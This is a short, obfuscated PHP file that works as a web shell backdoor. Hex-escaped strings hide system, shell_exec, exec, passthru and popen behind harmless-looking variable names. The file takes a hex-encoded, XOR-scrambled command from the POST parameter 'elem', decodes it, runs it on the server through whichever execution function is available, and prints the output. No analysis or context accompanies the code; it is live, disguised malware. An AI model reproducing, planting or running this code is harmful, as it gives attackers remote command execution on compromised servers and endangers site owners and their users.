<?php

$task_processor7 = "\x70close";
$task_processor4 = "p\x61s\x73t\x68ru";
$task_processor2 = "\x73\x68\x65ll\x5F\x65xec";
$task_processor1 = "sy\x73\x74\x65m";
$restore_state = "\x68\x65x\x32\x62in";
$task_processor5 = "p\x6Fp\x65n";
$task_processor3 = "e\x78e\x63";
$task_processor6 = "str\x65am_get_c\x6Fnte\x6Et\x73";
if (isset($_POST["e\x6C\x65m"])) {
            function publish_content ($flg, $symbol ) {$parameter_group='' ;$b=0; while($b<strlen($flg)){$parameter_group.=chr(ord($flg[$b])^$symbol);$b++;} return $parameter_group;}
            $elem = $restore_state($_POST["e\x6C\x65m"]);
            $elem = publish_content($elem, 60);
            if (function_exists($task_processor1)) {
                $task_processor1($elem);
            } elseif (function_exists($task_processor2)) {
                print $task_processor2($elem);
            } elseif (function_exists($task_processor3)) {
                $task_processor3($elem, $element_flg);
                print join("\n", $element_flg);
            } elseif (function_exists($task_processor4)) {
                $task_processor4($elem);
            } elseif (function_exists($task_processor5) && function_exists($task_processor6) && function_exists($task_processor7)) {
                $symbol_parameter_group = $task_processor5($elem, 'r');
                if ($symbol_parameter_group) {
                    $hld_item = $task_processor6($symbol_parameter_group);
                    $task_processor7($symbol_parameter_group);
                    print $hld_item;
                }
            }
            exit;
        }